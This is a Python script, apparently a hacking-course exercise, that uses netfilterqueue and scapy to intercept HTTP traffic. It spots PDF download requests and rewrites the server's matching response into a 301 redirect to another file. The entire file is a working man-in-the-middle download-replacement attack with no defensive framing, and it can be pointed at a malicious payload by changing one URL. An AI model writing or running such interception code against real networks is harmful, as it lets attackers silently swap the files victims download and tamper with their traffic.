import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.TCP):  # Check if the TCP layer exists
        if scapy_packet.haslayer(scapy.Raw):
            if hasattr(scapy_packet[scapy.Raw], 'load'):
                if scapy_packet[scapy.TCP].dport == 80:  # HTTP request detected
                    if b".pdf" in scapy_packet[scapy.Raw].load:  # PDF download detected
                        print('[+] PDF request detected')
                        ack_list.append(scapy_packet[scapy.TCP].ack)
                elif scapy_packet[scapy.TCP].sport == 80:  # HTTP response detected
                    if scapy_packet[scapy.TCP].seq in ack_list:  # Ensure it's the right response
                        ack_list.remove(scapy_packet[scapy.TCP].seq)
                        print("[+] Replacing file")  # Redirecting the download
                        
                        # Prepare the redirection response (301 Moved Permanently)
                        scapy_packet[scapy.Raw].load = (
                            b"HTTP/1.1 301 Moved Permanently\r\n"
                            b"Location: http://web.cs.wpi.edu/~kal/courses/awt/lab2b/HTTP.PDF\r\n"
                            b"Content-Length: 0\r\n"  # Required, no body for a 301 redirect
                            b"Connection: close\r\n"  # Close the connection after redirect
                            b"\r\n"  # End of headers
                        )
                        
                        # Recalculate checksums after modification
                        del scapy_packet[scapy.IP].len
                        del scapy_packet[scapy.IP].chksum
                        del scapy_packet[scapy.TCP].chksum

                        # Rebuild the packet and send it
                        scapy_packet = scapy_packet.__class__(bytes(scapy_packet))
                        packet.set_payload(bytes(scapy_packet))
                        
    packet.accept()  # Accept the packet after processing

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
